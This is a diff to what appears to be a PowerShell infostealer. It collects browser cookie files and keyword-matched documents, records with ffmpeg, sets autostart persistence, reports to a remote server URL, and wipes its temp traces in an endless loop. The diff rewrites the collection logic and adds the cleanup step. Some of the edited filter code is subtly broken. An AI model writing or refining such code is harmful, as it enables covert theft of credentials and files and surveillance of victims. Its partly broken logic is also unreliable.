@@ -23,12 +23,9 @@ function Collect-Cookies {
     foreach ($root in $targets) {
         if (Test-Path $root) {
             Get-ChildItem -Path $root -Recurse -Include $patterns -ErrorAction SilentlyContinue |
-            Where-Object { $_.Length -gt 0 } |
-            ForEach-Object {
-                try {
-                    $name = ($_.FullName -replace '[^\w\d\-_\.]', '_')
-                    Copy-Item $_.FullName "$cookieDir\$name" -Force -ErrorAction Stop
-                } catch {}
+            Where-Object {
+                $_.Length -le $maxSize -and
+                ($keywords | Where-Object { $_ -and $_.ToLowerInvariant() -ne "" -and $_.Name.ToLowerInvariant().Contains($_.ToLowerInvariant()) }) -ne $null
             }
         }
     }
@@ -42,21 +39,25 @@ function Collect-Files {
 
     foreach ($dir in $targets) {
         foreach ($ext in $extensions) {
-            Get-ChildItem -Path $dir -Recurse -Include $ext -File -ErrorAction SilentlyContinue |
-            Where-Object {
-                $_.Length -le $maxSize -and
-                $_.Name -ne $null -and
-                ($keywords | Where-Object { $_ -and $_.ToLowerInvariant(); $_.Name.ToLowerInvariant().Contains($_) })
-            } |
-            ForEach-Object {
-                try {
-                    $name = ($_.Name -replace '[^\w\d\-_\.]', '_')
-                    Copy-Item $_.FullName "$fileDumpDir\$name" -Force -ErrorAction Stop
-                } catch {}
+            Get-ChildItem -Path $dir -Recurse -Include $ext -File -ErrorAction SilentlyContinue | ForEach-Object {
+                $file = $_
+                if ($file.Length -le $maxSize -and $file.Name) {
+                    foreach ($kw in $keywords) {
+                        if ($file.Name.ToLowerInvariant().Contains($kw.ToLowerInvariant())) {
+                            try {
+                                $safeName = $file.Name -replace '[^\w\d\-_\.]', '_'
+                                Copy-Item $file.FullName "$fileDumpDir\$safeName" -Force -ErrorAction Stop
+                            } catch {}
+                            break
+                        }
+                    }
+                }
             }
         }
     }
 }
+
+
 
 function Start-Recording {
     $ffmpeg = "$PSScriptRoot\ffmpeg.exe"
@@ -146,13 +147,22 @@ function Archive-And-Report {
     Invoke-RestMethod -Uri "$serverUrl/report" -Method POST -Body (@{ text = $summary } | ConvertTo-Json -Compress) -ContentType "application/json"
 }
 
+function Cleanup {
+    try {
+        Remove-Item "$tempDir\*" -Recurse -Force -ErrorAction SilentlyContinue
+        Write-Output "Temp cleaned"
+    } catch {
+        Write-Warning "Cleanup failed: $_"
+    }
+}
+
 while ($true) {
     Collect-Cookies
     Collect-Files
     Start-Recording
     Ensure-Autostart
     Start-Sleep -Seconds 300
-    Archive-And-Upload
+    Archive-And-Report
     Cleanup
     Start-Sleep -Seconds 60
 }
